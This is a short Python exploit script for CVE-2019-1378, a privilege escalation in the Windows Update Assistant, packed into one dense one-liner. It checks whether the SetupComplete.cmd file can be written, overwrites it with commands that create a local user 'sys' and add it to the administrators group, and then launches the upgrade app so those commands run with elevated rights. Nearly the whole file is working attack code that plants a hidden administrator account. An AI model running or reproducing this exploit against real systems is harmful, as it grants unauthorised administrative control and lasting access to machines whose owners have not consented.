import os
[lambda x: [print(x), [open("C:\$GetCurrent\SafeOS\SetupComplete.cmd", 'w').write("@echo off\nnet user /add sys 1378\nnet localgroup administrators sys /add\ncall cmd.exe\npause"), os.system("C:\Windows10Upgrade\Windows10UpgraderApp.exe")]] if x[-1:] == '!' else [print(f"{x}\nSystem not vulnerable."), exit()]][0](f'System possibly vulnerable to CVE-2019-1378, proceeding to permission checks...\n{"User has permission to modify vulnerable files, proceeding to exploitation!" if os.access("C:/$GetCurrent/SafeOS/SetupComplete.cmd", os.W_OK) else "Permission denied on files."}' if os.path.isfile("C:\$GetCurrent\SafeOS\SetupComplete.cmd") else "Windows Update Manager is not installed on this system." if (True if os.path.isdir("C:\Windows10Upgrade") else False) else "Windows Update Manager is not installed on this system.") if __name__ == '__main__' else None

"""
Function: Exploit CVE-2019-1378
Original: https://github.com/Mili-NT/exploits/blob/master/local/cve-2019-1378.py
See warnings on original about permission and responsible use.
"""
